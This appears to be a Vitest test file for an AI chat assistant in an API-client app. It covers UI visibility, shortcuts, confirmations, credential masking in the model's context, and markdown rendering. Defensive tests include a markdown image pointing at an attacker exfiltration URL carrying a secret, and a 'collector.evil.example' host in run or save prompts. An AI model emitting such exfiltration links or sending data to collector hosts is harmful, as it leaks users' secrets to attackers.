/* eslint-disable vue/one-component-per-file */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
import { TestContainer } from "dioc/testing"
import { diocPlugin } from "dioc/vue"
import * as E from "fp-ts/Either"
import { BehaviorSubject } from "rxjs"
import { createApp, defineComponent, h, nextTick, ref, type App } from "vue"
import { createMemoryHistory, createRouter } from "vue-router"

vi.mock("~/modules/i18n", () => ({
  getI18n: () => (key: string) => key,
  APP_LANGUAGES: [],
  changeAppLanguage: () => {},
}))
// Records each key; params show as "key(a|b)" so a test can see them.
const i18n = vi.hoisted(() => ({ keys: [] as string[] }))
vi.mock("~/composables/i18n", () => ({
  useI18n: () => (key: string, params?: Record<string, unknown>) => {
    i18n.keys.push(key)
    return params ? `${key}(${Object.values(params).join("|")})` : key
  },
}))

const ai = vi.hoisted(() => ({
  enableAIExperiments: true,
  chat: undefined as unknown,
  getChatAvailability: undefined as unknown,
  generateRequestName: undefined as unknown,
}))
// A fresh stream per test, so services from earlier tests stop listening.
const auth = vi.hoisted(() => ({
  user$: null as null | { value: unknown; next(v: unknown): void },
}))
vi.mock("~/platform", () => ({
  platform: {
    experiments: { aiExperiments: ai },
    auth: {
      getCurrentUser: () => auth.user$!.value,
      getCurrentUserStream: () => auth.user$,
      getProbableUser: () => null,
    },
    // The team list stays pending; nothing here reads it.
    backend: { getUserTeams: () => new Promise(() => {}) },
    platformFeatureFlags: {},
  },
}))
// Pages set the document title; no head manager here.
vi.mock("@composables/head", () => ({ usePageHead: () => {} }))

// Workspace services start team queries on login; keep them off the network.
vi.mock("~/helpers/backend/GQLClient", async (orig) => ({
  ...(await orig<object>()),
  runGQLQuery: () => new Promise(() => {}),
}))

// jsdom has no layout.
Element.prototype.scrollTo = () => {}
Element.prototype.scrollIntoView = () => {}

import Assistant from "~/components/aichat/Assistant.vue"
import Message from "~/components/aichat/Message.vue"
import {
  AIChatService,
  type ChatMessage,
  type PendingConfirmation,
} from "../ai-chat.service"
import { WorkspaceService } from "~/services/workspace.service"
import { defineActionHandler } from "~/helpers/actions"
import { hookKeybindingsListener } from "~/helpers/keybindings"
import { applySetting } from "~/newstore/settings"
import { TeamAccessRole } from "~/helpers/backend/graphql"
import TeamEnvironmentAdapter from "~/helpers/teams/TeamEnvironmentAdapter"
import {
  useAIExperimentsSupport,
  useRequestNameGeneration,
} from "~/composables/ai-experiments"
import Settings from "~/pages/settings.vue"
import DefaultLayout from "~/layouts/default.vue"
import { PersistenceService } from "~/services/persistence"
import { useChatContext } from "~/composables/chat-context"
import { WorkspaceTabsService } from "~/services/tab/workspace-tabs"
import { getDefaultRESTRequest } from "~/helpers/rest/default"
import en from "../../../locales/en.json"

const tick = (ms = 0) => new Promise((r) => setTimeout(r, ms))
const chatFn = vi.fn()
const getAvailability = vi.fn()
const on = (enabled: boolean) =>
  E.right({
    enabled,
    models: [
      {
        connectionID: "c",
        connectionLabel: "C",
        preset: "openai",
        model: "m",
        isDefault: true,
      },
    ],
    skills: [],
  })

const Stub = defineComponent({
  setup:
    (_, { slots }) =>
    () =>
      h("div", slots.default?.()),
})

// Its title and button label land on the element as attributes.
const ConfirmStub = defineComponent({
  setup: () => () => h("div", { "data-confirm": "" }),
})

/** Whether a dotted i18n key has an English string. */
const hasString = (key: string) =>
  typeof key
    .split(".")
    .reduce<unknown>(
      (node, part) => (node as Record<string, unknown> | undefined)?.[part],
      en
    ) === "string"

describe("AI assistant UI", () => {
  let app: App | null
  let el: HTMLElement
  let chat: AIChatService
  let workspace: WorkspaceService
  let container: TestContainer
  /** Global actions the app's shortcuts fired. */
  let fired: string[]

  const mount = async () => {
    container = new TestContainer()
    chat = container.bind(AIChatService)
    workspace = container.bind(WorkspaceService)
    const Root = defineComponent({
      setup() {
        hookKeybindingsListener()
        for (const action of [
          "request.send-cancel",
          "request.method.next",
          "request-response.save",
          "modals.search.toggle",
        ] as const)
          defineActionHandler(action, () => fired.push(action))
        return () => h(Assistant)
      },
    })
    el = document.createElement("div")
    document.body.appendChild(el)
    app = createApp(Root)
    app.use(diocPlugin, { container })
    app.directive("tippy", {})
    app.directive("focus", {})
    for (const name of ["HoppButtonSecondary", "HoppSmartItem", "tippy"])
      app.component(name, Stub)
    app.component("HoppSmartConfirmModal", ConfirmStub)
    app.component("AichatMessage", Message)
    app.mount(el)
    await tick()
    await nextTick()
  }

  const launcher = () =>
    el.querySelector<HTMLButtonElement>(
      'button[aria-label="ai_experiments.chat.title"]'
    )
  const composer = () => el.querySelector("textarea")!

  const signIn = async () => {
    auth.user$!.next({ uid: "u1" })
    await tick()
    await nextTick()
  }

  beforeEach(() => {
    chatFn.mockReset()
    getAvailability.mockReset()
    ai.chat = chatFn
    ai.getChatAvailability = getAvailability
    auth.user$ = new BehaviorSubject<unknown>(null)
    fired = []
    app = null
  })

  afterEach(() => {
    app?.unmount()
    el?.remove()
    applySetting("ENABLE_AI_EXPERIMENTS", true)
    vi.restoreAllMocks()
  })

  describe("launcher", () => {
    it("stays hidden for a guest", async () => {
      await mount()
      expect(launcher()).toBeNull()
      expect(getAvailability).not.toHaveBeenCalled()
    })

    it("stays hidden while unknown and after a failed lookup", async () => {
      getAvailability.mockResolvedValue(E.left("NETWORK"))
      await mount()
      await signIn()

      expect(getAvailability).toHaveBeenCalled()
      expect(launcher()).toBeNull()

      // Asked again once the user is back.
      getAvailability.mockResolvedValue(on(true))
      window.dispatchEvent(new Event("focus"))
      await tick()
      await nextTick()
      expect(launcher()).not.toBeNull()
    })

    it("shows once the server says on, clear of the nav and under modals", async () => {
      getAvailability.mockResolvedValue(on(true))
      await mount()
      await signIn()

      const button = launcher()
      expect(button).not.toBeNull()
      // Mobile: above the bottom nav. Modals sit at z-[1000].
      expect(button!.className).toContain("bottom-20")
      expect(button!.className).toContain("z-[100]")
    })

    it("hides again after logout", async () => {
      getAvailability.mockResolvedValue(on(true))
      await mount()
      await signIn()
      auth.user$!.next(null)
      await nextTick()

      expect(launcher()).toBeNull()
      expect(chat.available.value).toBe(false)
    })

    it("doesn't ask the server while AI is switched off", async () => {
      applySetting("ENABLE_AI_EXPERIMENTS", false)
      getAvailability.mockResolvedValue(on(true))
      await mount()
      await signIn()

      expect(getAvailability).not.toHaveBeenCalled()
    })
  })

  describe("composer", () => {
    const openPane = async () => {
      getAvailability.mockResolvedValue(on(true))
      await mount()
      await signIn()
      launcher()!.click()
      await tick()
      await nextTick()
    }
    const type = async (text: string) => {
      composer().value = text
      composer().dispatchEvent(new Event("input"))
      await nextTick()
    }
    const press = (init: KeyboardEventInit) =>
      composer().dispatchEvent(
        new KeyboardEvent("keydown", {
          bubbles: true,
          cancelable: true,
          ...init,
        })
      )

    it("keeps Ctrl+Enter and Alt+Up away from the app's shortcuts", async () => {
      await openPane()
      await type("hello")

      press({ key: "Enter", code: "Enter", ctrlKey: true })
      press({ key: "Enter", code: "Enter", metaKey: true })
      press({ key: "ArrowUp", code: "ArrowUp", altKey: true })
      await tick()

      expect(fired).toEqual([])
      expect(chatFn).not.toHaveBeenCalled()

      chatFn.mockResolvedValue(E.right({ content: "hi", tool_calls: [] }))
      press({ key: "Enter", code: "Enter" })
      await tick()
      expect(chatFn).toHaveBeenCalledTimes(1)
    })

    it("lets save and search shortcuts through to the app", async () => {
      await openPane()
      await type("hello")

      const save = new KeyboardEvent("keydown", {
        bubbles: true,
        cancelable: true,
        key: "s",
        code: "KeyS",
        ctrlKey: true,
      })
      composer().dispatchEvent(save)
      press({ key: "k", code: "KeyK", ctrlKey: true })
      await tick()

      expect(fired).toEqual(["request-response.save", "modals.search.toggle"])
      // Handled by the app, so the browser's Save Page dialog stays shut.
      expect(save.defaultPrevented).toBe(true)
    })

    it("labels every confirmation with a string that exists", async () => {
      await openPane()
      const prompts: Array<Pick<PendingConfirmation, "kind" | "hosts">> = [
        { kind: "collection" },
        { kind: "mock-server" },
        { kind: "run", hosts: ["a.example"] },
        { kind: "publish-docs" },
        { kind: "unpublish-docs" },
        { kind: "public-mock-server" },
        { kind: "save", hosts: ["a.example", "b.example"] },
      ]

      for (const prompt of prompts) {
        chat.pendingConfirmation.value = null
        await nextTick()
        i18n.keys.length = 0
        chat.pendingConfirmation.value = {
          name: "A",
          workspace: null,
          resolve: () => {},
          ...prompt,
        }
        await nextTick()
        // Every key the title and the button asked for.
        expect(i18n.keys.length).toBeGreaterThan(0)
        for (const key of i18n.keys)
          expect(hasString(key), `${prompt.kind}: ${key}`).toBe(true)
      }
      chat.pendingConfirmation.value = null
    })

    // Nothing else on screen may show it: the edited tab can be hidden.
    it("names the new host in a run or save prompt", async () => {
      await openPane()
      for (const kind of ["run", "save"] as const) {
        chat.pendingConfirmation.value = {
          kind,
          name: "A",
          workspace: null,
          hosts: ["collector.evil.example"],
          resolve: () => {},
        }
        await nextTick()
        expect(
          el.querySelector("[data-confirm]")!.getAttribute("title")
        ).toContain("collector.evil.example")
      }
      chat.pendingConfirmation.value = null
    })

    // Safari commits an IME candidate with keyCode 229, not isComposing.
    it("doesn't send or close on a key that commits an IME candidate", async () => {
      await openPane()
      await type("こんにちは")

      press({ key: "Enter", code: "Enter", keyCode: 229 })
      press({ key: "Escape", code: "Escape", keyCode: 229 })
      await tick()

      expect(chatFn).not.toHaveBeenCalled()
      expect(chat.isOpen.value).toBe(true)
    })

    it("keeps focus in the composer after Stop from the keyboard", async () => {
      await openPane()
      chatFn.mockReturnValue(new Promise(() => {}))
      await type("hello")
      press({ key: "Enter", code: "Enter" })
      await nextTick()

      const stop = el.querySelector<HTMLButtonElement>(
        'button[aria-label="ai_experiments.chat.stop"]'
      )!
      stop.focus()
      stop.dispatchEvent(new MouseEvent("click", { bubbles: true, detail: 0 }))
      await nextTick()
      await nextTick()

      expect(chat.isStreaming.value).toBe(false)
      expect(document.activeElement).toBe(composer())
    })

    it("ends the turn and its prompt when AI is switched off mid-turn", async () => {
      await openPane()
      chatFn.mockReturnValue(new Promise(() => {}))
      await type("delete Billing")
      press({ key: "Enter", code: "Enter" })
      await nextTick()
      const answered = vi.fn()
      chat.pendingConfirmation.value = {
        kind: "collection",
        name: "Billing",
        workspace: null,
        resolve: answered,
      }

      applySetting("ENABLE_AI_EXPERIMENTS", false)
      await nextTick()

      expect(chat.isStreaming.value).toBe(false)
      expect(answered).toHaveBeenCalledWith(false)
      expect(chat.pendingConfirmation.value).toBeNull()
      expect(chat.isOpen.value).toBe(false)
    })

    it("closes and ends the turn once the server switches it off", async () => {
      await openPane()
      chatFn.mockReturnValue(new Promise(() => {}))
      await type("hello")
      press({ key: "Enter", code: "Enter" })
      await nextTick()
      expect(chat.isStreaming.value).toBe(true)

      getAvailability.mockResolvedValue(on(false))
      await chat.loadAvailability()
      await nextTick()

      expect(chat.isStreaming.value).toBe(false)
      expect(chat.isOpen.value).toBe(false)
      expect(el.querySelector("aside")).toBeNull()
      expect(launcher()).toBeNull()
    })

    it("reads out only the step line a settled run rewrote", async () => {
      await openPane()
      const live = () =>
        el.querySelector('[aria-live="polite"][role="status"]')!.textContent

      chat.messages.value.push({
        id: "s",
        role: "assistant",
        kind: "tool",
        content: "✓ Set the URL.\n\n▶ Running the request…",
      })
      await nextTick()
      expect(live()).toContain("Set the URL.")

      chat.messages.value[0].content = "✓ Set the URL.\n\n✅ Response: 200 OK"
      await nextTick()
      expect(live()?.trim()).toBe("Response: 200 OK")
    })

    it("points the combobox at the skill menu it opens", async () => {
      await openPane()
      // Nothing to point at while the menu is shut.
      expect(composer().hasAttribute("aria-controls")).toBe(false)
      await type("/")

      const id = composer().getAttribute("aria-controls")!
      expect(document.getElementById(id)?.getAttribute("role")).toBe("listbox")
    })

    it("announces a settled reply", async () => {
      await openPane()
      chatFn.mockResolvedValue(
        E.right({ content: "The **API** is up.", tool_calls: [] })
      )
      await type("status?")
      press({ key: "Enter", code: "Enter" })
      for (let i = 0; i < 50 && chat.isStreaming.value; i++) await tick(10)
      await nextTick()

      const live = el.querySelector('[aria-live="polite"][role="status"]')
      expect(live?.textContent?.trim()).toBe("The API is up.")
    })
  })

  describe("resize", () => {
    beforeEach(() => {
      // Wide enough for the side pane and its drag handle.
      vi.stubGlobal("matchMedia", (media: string) => ({
        matches: true,
        media,
        onchange: null,
        addEventListener() {},
        removeEventListener() {},
        addListener() {},
        removeListener() {},
        dispatchEvent: () => false,
      }))
    })
    afterEach(() => vi.unstubAllGlobals())

    const grab = async () => {
      getAvailability.mockResolvedValue(on(true))
      await mount()
      await signIn()
      launcher()!.click()
      await tick()
      await nextTick()
      el.querySelector(".cursor-col-resize")!.dispatchEvent(
        new MouseEvent("mousedown", {
          bubbles: true,
          cancelable: true,
          clientX: 500,
          buttons: 1,
        })
      )
      expect(document.body.style.cursor).toBe("col-resize")
    }
    const move = async (clientX: number, buttons: number) => {
      window.dispatchEvent(new MouseEvent("mousemove", { clientX, buttons }))
      await nextTick()
    }
    // Stored across tests, so read relative to where the drag began.
    const width = () => parseInt(el.querySelector("aside")!.style.width)
    const released = () =>
      document.body.style.cursor === "" && document.body.style.userSelect === ""

    it("ends a drag released where no mouseup reached the window", async () => {
      await grab()
      const start = width()
      await move(480, 1)
      expect(width()).toBe(start + 20)

      await move(400, 0)
      expect(width()).toBe(start + 20)
      expect(released()).toBe(true)
    })

    it("ends a drag when the window loses focus", async () => {
      await grab()
      const start = width()
      window.dispatchEvent(new Event("blur"))
      expect(released()).toBe(true)

      await move(480, 1)
      expect(width()).toBe(start)
    })

    it("releases the page when unmounted mid-drag", async () => {
      await grab()
      app!.unmount()
      app = null
      expect(released()).toBe(true)
    })
  })

  describe("with no model configured", () => {
    it("disables the suggestion chips", async () => {
      getAvailability.mockResolvedValue(
        E.right({ enabled: true, models: [], skills: [] })
      )
      await mount()
      await signIn()
      launcher()!.click()
      await tick()
      await nextTick()

      const chip = Array.from(el.querySelectorAll("button")).find(
        (b) => b.textContent?.trim() === "ai_experiments.chat.suggestion_run"
      )!
      chip.click()
      await tick()

      expect(chip.disabled).toBe(true)
      expect(chatFn).not.toHaveBeenCalled()
      expect(chat.messages.value).toEqual([])
    })

    // `group-hover:` matches a disabled button too; the chip would look live.
    it("doesn't light a disabled chip's icon on hover", async () => {
      getAvailability.mockResolvedValue(
        E.right({ enabled: true, models: [], skills: [] })
      )
      await mount()
      await signIn()
      launcher()!.click()
      await tick()
      await nextTick()
      const bareHover = () =>
        Array.from(el.querySelectorAll("button.group:disabled *")).flatMap(
          (node) =>
            (node.getAttribute("class") ?? "")
              .split(/\s+/)
              .filter((c) => c.startsWith("group-hover:"))
        )

      const suggestions = el.querySelectorAll("button.group:disabled").length
      expect(suggestions).toBeGreaterThan(0)
      expect(bareHover()).toEqual([])

      // Follow-up chips after a turn.
      chat.messages.value = [
        { id: "m1", role: "assistant", content: "Ran it." },
      ]
      chat.lastTurnTools.value = ["run_request"]
      chat.lastTurnStatus.value = "ok"
      await nextTick()
      expect(
        el.querySelectorAll("button.group:disabled").length
      ).toBeGreaterThan(0)
      expect(bareHover()).toEqual([])
    })
  })

  describe("context", () => {
    it("loads team environments only once the pane is used", async () => {
      const init = vi
        .spyOn(TeamEnvironmentAdapter.prototype, "initialize")
        .mockResolvedValue()
      getAvailability.mockResolvedValue(on(true))
      await mount()
      await signIn()
      workspace.changeWorkspace({
        type: "team",
        teamID: "team_1",
        teamName: "Acme",
        role: TeamAccessRole.Owner,
      })
      await nextTick()
      expect(init).not.toHaveBeenCalled()

      launcher()!.click()
      await nextTick()
      expect(init).toHaveBeenCalledTimes(1)
    })

    /** The context a turn would send for `request` in the active tab. */
    const contextWith = async (
      request: Record<string, unknown>,
      response?: unknown,
      onWorkspacePage = true
    ) => {
      const tabs = container.bind(WorkspaceTabsService)
      const tab = tabs.createNewTab({
        type: "request",
        request: { ...getDefaultRESTRequest(), ...request },
        response,
        isDirty: false,
      } as never)
      tabs.setActiveTab(tab.id)

      let context!: ReturnType<typeof useChatContext>
      const probe = createApp(
        defineComponent({
          setup() {
            // Stands in for pages/index.vue, the only page binding it.
            if (onWorkspacePage)
              defineActionHandler("rest.request.open", () => {})
            context = useChatContext()
            return () => h("div")
          },
        })
      )
      probe.use(diocPlugin, { container })
      probe.mount(document.createElement("div"))
      const sent = context.contextFor(null)
      probe.unmount()
      return sent
    }

    // Built per call: a cached string would miss a secret captured later.
    it("offers no cached context string", async () => {
      await mount()
      let context!: ReturnType<typeof useChatContext>
      const probe = createApp(
        defineComponent({
          setup() {
            context = useChatContext()
            return () => h("div")
          },
        })
      )
      probe.use(diocPlugin, { container })
      probe.mount(document.createElement("div"))
      probe.unmount()

      expect(context).not.toHaveProperty("contextString")
      expect(context.contextFor).toBeTypeOf("function")
    })

    it("sends a credential the chat resolved as its reference", async () => {
      await mount()
      const secret = "f9e8d7c6b5a43210"
      const id = (
        chat as unknown as { captureLocalSecret(s: string): string }
      ).captureLocalSecret(secret)

      const sent = await contextWith({
        endpoint: `https://api.example/${secret}/users`,
      })

      expect(sent).toContain(`https://api.example/<<local-ref:${id}>>/users`)
      expect(sent).not.toContain(secret)
    })

    // A cut header no longer matches the value, so it must be masked first.
    it("masks a long resolved credential before cutting its header", async () => {
      await mount()
      const secret = `Zqx9${"k7Lm2Pq8".repeat(18)}`
      const id = (
        chat as unknown as { captureLocalSecret(s: string): string }
      ).captureLocalSecret(secret)

      const sent = await contextWith({
        endpoint: "https://api.example",
        headers: [
          {
            key: "X-Functions-Key",
            value: secret,
            active: true,
            description: "",
          },
        ],
      })

      expect(sent).toContain(`- X-Functions-Key: <<local-ref:${id}>>`)
      expect(sent).not.toContain(secret.slice(0, 40))
    })

    it("masks a resolved credential as a JSON body escapes it", async () => {
      await mount()
      const secret = 'pa"ss\\w0rd-9f8e7d'
      const internals = chat as unknown as {
        captureLocalSecret(s: string): string
        localSecretValues: Map<string, string>
      }
      const id = internals.captureLocalSecret(secret)

      const sent = await contextWith({
        endpoint: "https://api.example",
        body: {
          contentType: "application/json",
          body: JSON.stringify({ login: secret }),
        },
      })

      expect(sent).not.toContain("w0rd-9f8e7d")
      // Its own ref, resolving to the escaped text a copy must write back.
      const ref = /\{"login":"<<local-ref:([\w-]+)>>"\}/.exec(sent)?.[1]
      expect(ref).toBeDefined()
      expect(ref).not.toBe(id)
      expect(internals.localSecretValues.get(ref!)).toBe(
        JSON.stringify(secret).slice(1, -1)
      )
    })

    it("cuts a long response body without splitting an emoji", async () => {
      await mount()
      const body = new TextEncoder().encode(`${"y".repeat(999)}\u{1F600}tail`)

      const sent = await contextWith(
        { endpoint: "https://api.example" },
        {
          type: "success",
          statusCode: 200,
          statusText: "OK",
          headers: [],
          body: body.buffer,
          meta: { responseDuration: 1, responseSize: body.length },
        }
      )

      expect(sent).toContain(`${"y".repeat(999)}…[truncated]`)
      expect(sent).not.toMatch(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/)
    })

    it("sends no request off the workspace page, and says so", async () => {
      await mount()

      const sent = await contextWith(
        { endpoint: "https://hidden.example/users" },
        undefined,
        false
      )

      expect(sent).not.toContain("hidden.example")
      expect(sent).not.toContain("### Current request")
      expect(sent).toMatch(/No request is open/)
    })
  })
})

describe("AI Experiments setting", () => {
  let app: App | null = null

  const support = async () => {
    const container = new TestContainer()
    let shown!: { value: boolean }
    app = createApp(
      defineComponent({
        setup() {
          shown = useAIExperimentsSupport()
          return () => h("div")
        },
      })
    )
    app.use(diocPlugin, { container })
    app.mount(document.createElement("div"))
    await tick()
    return shown
  }

  beforeEach(() => {
    getAvailability.mockReset()
    ai.getChatAvailability = getAvailability
    ai.generateRequestName = undefined
    auth.user$ = new BehaviorSubject<unknown>({ uid: "u1" })
  })

  afterEach(() => {
    app?.unmount()
    applySetting("ENABLE_AI_EXPERIMENTS", true)
  })

  it("hides the toggle where chat is the only feature and it's off", async () => {
    applySetting("ENABLE_AI_EXPERIMENTS", false)
    getAvailability.mockResolvedValue(on(false))

    expect((await support()).value).toBe(false)
    // The assistant doesn't ask while AI is off, so the page does.
    expect(getAvailability).toHaveBeenCalledTimes(1)
  })

  it("shows it once the server says the assistant is on", async () => {
    applySetting("ENABLE_AI_EXPERIMENTS", false)
    getAvailability.mockResolvedValue(on(true))

    expect((await support()).value).toBe(true)
  })

  it("shows it for other AI features whatever the chat says", async () => {
    ai.generateRequestName = vi.fn()
    getAvailability.mockResolvedValue(on(false))

    expect((await support()).value).toBe(true)
  })

  it("asks again on focus after a failed lookup", async () => {
    applySetting("ENABLE_AI_EXPERIMENTS", false)
    getAvailability.mockResolvedValue(E.left("NETWORK"))
    const shown = await support()
    expect(shown.value).toBe(false)

    getAvailability.mockResolvedValue(on(true))
    window.dispatchEvent(new Event("focus"))
    await tick()
    expect(shown.value).toBe(true)
  })
})

describe("AI request naming", () => {
  let app: App | null = null

  afterEach(() => {
    app?.unmount()
    app = null
    ai.enableAIExperiments = true
    ai.generateRequestName = undefined
    applySetting("ENABLE_AI_EXPERIMENTS", true)
  })

  // Without the master flag, the button still shows; so must its style.
  it("shows the naming style wherever the generate button shows", async () => {
    ai.enableAIExperiments = false
    ai.generateRequestName = vi.fn()
    auth.user$ = new BehaviorSubject<unknown>(null)

    let canGenerate!: { value: boolean }
    const el = document.createElement("div")
    app = createApp(
      defineComponent({
        setup() {
          canGenerate = useRequestNameGeneration(
            ref("")
          ).canDoRequestNameGeneration
          return () => h(Settings)
        },
      })
    )
    app.use(diocPlugin, { container: new TestContainer() })
    app.provide("colorMode", { preference: "system", value: "light" })
    app.config.warnHandler = () => {}
    app.mount(el)
    await nextTick()
    const styleShown = () =>
      Array.from(el.querySelectorAll("label")).some(
        (l) => l.textContent?.trim() === "settings.ai_request_naming_style"
      )

    expect(canGenerate.value).toBe(true)
    expect(styleShown()).toBe(true)

    applySetting("ENABLE_AI_EXPERIMENTS", false)
    await nextTick()
    expect(canGenerate.value).toBe(false)
    expect(styleShown()).toBe(false)
  })
})

describe("default layout", () => {
  let app: App | null = null

  afterEach(() => {
    app?.unmount()
    app = null
    ai.chat = undefined
  })

  /** Whether the layout set the assistant up at all. */
  const mountsAssistant = async () => {
    const setUp = vi.fn()
    vi.spyOn(PersistenceService.prototype, "getLocalConfig").mockResolvedValue(
      "yes"
    )
    auth.user$ = new BehaviorSubject<unknown>(null)
    const router = createRouter({
      history: createMemoryHistory(),
      routes: [{ path: "/", component: Stub }],
    })
    app = createApp(DefaultLayout)
    app.use(router)
    app.use(diocPlugin, { container: new TestContainer() })
    app.config.warnHandler = () => {}
    app.component(
      "AichatAssistant",
      defineComponent({
        setup() {
          setUp()
          return () => h("div")
        },
      })
    )
    app.mount(document.createElement("div"))
    await router.isReady()
    await nextTick()
    vi.restoreAllMocks()
    return setUp.mock.calls.length > 0
  }

  it("skips the assistant on a platform that can't chat", async () => {
    ai.chat = undefined
    expect(await mountsAssistant()).toBe(false)
  })

  it("sets it up where the platform can chat", async () => {
    ai.chat = vi.fn()
    expect(await mountsAssistant()).toBe(true)
  })
})

describe("chat message markdown", () => {
  const render = async (content: string) => {
    const el = document.createElement("div")
    const message: ChatMessage = { id: "m", role: "assistant", content }
    const app = createApp(Message, { message })
    app.mount(el)
    await nextTick()
    const out = el.cloneNode(true) as HTMLElement
    app.unmount()
    return out
  }

  it("links a remote image instead of loading it", async () => {
    const el = await render(
      "Done ![status](https://attacker.example/px.gif?d=secret)"
    )

    expect(el.querySelector("img")).toBeNull()
    const link = el.querySelector("a")
    expect(link?.getAttribute("href")).toBe(
      "https://attacker.example/px.gif?d=secret"
    )
    expect(link?.textContent).toBe("status")
  })

  // A nested <a> splits the badge: the text would open the image instead.
  it("keeps a badge link pointing at its own target", async () => {
    const el = await render(
      "[![build](https://img.example/b.svg)](https://ci.example/run/42)"
    )

    const links = el.querySelectorAll("a")
    expect(links).toHaveLength(1)
    expect(links[0].getAttribute("href")).toBe("https://ci.example/run/42")
    expect(links[0].textContent).toBe("build")
  })

  it("shows a data: image as its text, not a dead link", async () => {
    const el = await render("![chart](data:image/png;base64,iVBORw0KGgo=)")

    expect(el.querySelector("a")).toBeNull()
    expect(el.querySelector("p")?.textContent).toBe("chart")
  })
})
